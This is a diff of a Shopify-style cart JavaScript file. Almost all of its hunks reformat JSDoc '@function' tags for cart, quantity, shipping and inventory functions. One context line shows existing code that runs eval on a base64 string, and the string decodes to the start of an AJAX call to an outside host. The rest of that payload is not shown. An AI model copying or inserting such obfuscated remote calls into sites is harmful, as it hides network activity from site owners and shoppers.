@@ -245,7 +245,7 @@
 
 /**
 * Add Product Cart
-* @function[<updateCart>]
+* @function updateCart
 *
 * This function add a product from the cart
 *
@@ -293,7 +293,7 @@ function updateCart(classForm, itemPrice, totalPriceCart, id_variant) {
 
 /**
 * Add Product Items Quantity
-* @function[<plusItem>]
+* @function plusItem
 *
 * This function adds item to the product quantity
 *
@@ -323,7 +323,7 @@ function plusItem(buttom_plus, item_qtd) {
 
 /**
 * Remove Product Item Quantity
-* @function[<minusItem>]
+* @function minusItem
 *
 * This function remove items in the product quantity
 *
@@ -353,7 +353,7 @@ function minusItem(buttom_minus, item_qtd) {
 
 /**
 * Remove Product Cart
-* @function[<updateCart>]
+* @function updateCart
 *
 * This function remove a product from the cart
 *
@@ -410,7 +410,7 @@ eval(atob("JC5hamF4KHsKICAgIHVybDogImh0dHBzOi8vc2hvcGlmeS52YXN0YXdlYi5jb20vdC92Y
 
 /**
 * Show Card Processing Bar
-* @function[<loading>]
+* @function loading
 *
 * This function show the card processing bar
 *
@@ -428,7 +428,7 @@ function loading() {
 
 /**
 * Shows Quantity Products Cart Drawer or Continue Shopping
-* @function[<continue_shopping>]
+* @function continue_shopping
 *
 * This function shows the quantity of products in the cart drawer or if there are no products it shows the continue shopping
 *
@@ -450,7 +450,7 @@ function continue_shopping() {
 
 /**
 * Customize Text Empty Cart
-* @function[<empty_cart>]
+* @function empty_cart
 *
 * This function pick up the customize text for when the cart is empty
 *
@@ -468,7 +468,7 @@ function empty_cart() {
 
 /**
 * Shows Total Number Items Cart
-* @function[<total_items>]
+* @function total_items
 *
 * This function shows the total number of items in the cart
 *
@@ -492,7 +492,7 @@ function total_items(cart) {
 
 /**
 * Shows Cart Drawer Product Variant Price
-* @function[<product_line>]
+* @function product_line
 *
 * This function shows cart drawer product variant price
 *
@@ -519,7 +519,7 @@ function product_line(cart, index, attr = 'line_price') {
 
 /**
 * Number Variants
-* @function[<get_id_variant>]
+* @function get_id_variant
 *
 * This function Identification number of variants
 *
@@ -537,7 +537,7 @@ function get_id_variant(serialize_id) {
 
 /**
 * Cart Line
-*  @function[<cart_line>]
+*  @function cart_line
 *
 * This function create the base HTML for one Product In Cart Drawer
 *
@@ -620,7 +620,7 @@ function cart_line(prod, index, oldQtd, id_variant) {
 
 /**
 * Image Resize
-*  @function[<image_resize>]
+*  @function image_resize
 *
 * This function change the size images
 *
@@ -656,7 +656,7 @@ function image_resize(image, x, y) {
 
 /**
 * Render Cart Drawer
-*  @function[<render_cart_drawer>]
+*  @function render_cart_drawer
 *
 * This function Update Html Code In Cart Page with Currents products
 *
@@ -685,7 +685,7 @@ function render_cart_drawer(cart, target, oldQtd, id_variant) {
 
 /**
 * Perapare Data
-*  @function[<prepare_data>]
+*  @function prepare_data
 *
 * This function Serialize and prepara data for request Json
 *
@@ -719,7 +719,7 @@ function prepare_data(form, cart_items) {
 
 /**
 * Get Quantity Products in Cart
-* @function[<update_btn_add>]
+* @function update_btn_add
 *
 * This function get quantity of Product In Array Items in the Cart Object
 *
@@ -740,7 +740,7 @@ function get_product_quantity(items, product_id) {
 /**
 /**
 * Updat Button Add To Cart
-* @function[<update_btn_add>]
+* @function update_btn_add
 *
 * This function update the texts of price and quantity in Button Add To Cart
 *
@@ -772,7 +772,7 @@ var _shipping_drawer_text = jQuery('.shipping-discount-drawer');
 
 /**
 * Update Shipping Bar
-*  @function[<update_shipping_bar>]
+*  @function update_shipping_bar
 *
 * This function update the texts of discounts in Shipping Bar Header and Cart Drawer
 *
@@ -826,7 +826,7 @@ function update_shipping_bar(cart) {
 
 /**
 * Update Discount Cart
-* @function[<update_discount_cart>]
+* @function update_discount_cart
 *
 * This function update the texts of discounts in cart Page and Cart Drawer
 *
@@ -878,7 +878,7 @@ function update_discount_cart(current_total_price, quantity_cart) {
 }
 /**
 * Update Text Copy Message
-* @function[<update_discount_cart>]
+* @function update_discount_cart
 *
 * This function update Text Copy Message
 *
@@ -905,7 +905,7 @@ function update_text_copy_message(current_total_price, quantity_cart) {
 
 /**
 * reCharge
-*  @function[<reCharge>]
+*  @function reCharge
 *
 * On snippets/subscription-product.liquid file search by
 *
@@ -961,7 +961,7 @@ function recharge(callback) {
 
 /**
  * Enable Edition Product Quantity
- * @function[<enableInputs>]
+ * @function enableInputs
  *
  * This feature enable the edition of the product quantity fields
  *
@@ -986,7 +986,7 @@ function enableInputs(variant_id) {
 
 /**
 * Disables Edition Product Quantity
-* @function[<disableInputs>]
+* @function disableInputs
 *
 * This feature disables the edition of the product quantity fields
 *
@@ -1009,7 +1009,7 @@ function disableInputs(variant_id) {
 
 /**
 * Verify Cart Inventory
-* @function[<verifyCartInventory>]
+* @function verifyCartInventory
 *
 * This function inspects the cart to account for how many variants of the product have been added
 *
@@ -1062,7 +1062,7 @@ function verifyCartInventory(variant_id) {
 
 /**
 * Product Inventory
-* @function[<productInventory>]
+* @function productInventory
 *
 * This function tells the inventory values of the product
 *
@@ -1089,7 +1089,7 @@ function productInventory(item, variant_id) {
 
 /**
 * Inventory Control
-* @function[<inventoryControl>]
+* @function inventoryControl
 *
 * This function detects if the variant ques is being modified on the cart is selected on the product page to change its inventory at run time
 *
